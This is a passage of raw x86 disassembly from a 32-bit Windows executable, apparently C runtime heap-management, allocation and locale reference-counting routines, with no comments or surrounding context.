  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
